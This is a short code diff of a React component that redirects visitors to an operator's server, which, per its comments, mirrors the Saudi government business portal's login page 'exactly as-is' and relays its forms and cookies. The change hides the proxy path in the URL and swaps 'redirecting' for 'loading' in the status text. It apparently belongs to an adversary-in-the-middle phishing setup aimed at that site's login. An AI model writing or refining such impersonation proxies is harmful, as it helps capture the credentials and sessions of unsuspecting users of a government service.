@@ -4,10 +4,9 @@ const SERVER_URL = import.meta.env.VITE_SOCKET_URL || "http://localhost:3001";
 
 export default function SaudiBusinessProxy() {
   useEffect(() => {
-    // Redirect directly to the server proxy - no iframe, no fetch
-    // This ensures the browser navigates directly to the proxy server
-    // which handles all pages, forms, redirects, and cookies natively
-    window.location.href = `${SERVER_URL}/p/sb/Identity/Account/Login`;
+    // Redirect to the server which serves saudibusiness.gov.sa at root
+    // The user sees the original site exactly as-is
+    window.location.href = `${SERVER_URL}/Identity/Account/Login`;
   }, []);
 
   return (
@@ -31,7 +30,7 @@ export default function SaudiBusinessProxy() {
           animation: "spin 0.8s linear infinite",
           margin: "0 auto 16px",
         }} />
-        <p style={{ color: "#6b7280", fontSize: 16 }}>جاري التحويل...</p>
+        <p style={{ color: "#6b7280", fontSize: 16 }}>جاري التحميل...</p>
         <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
       </div>
     </div>
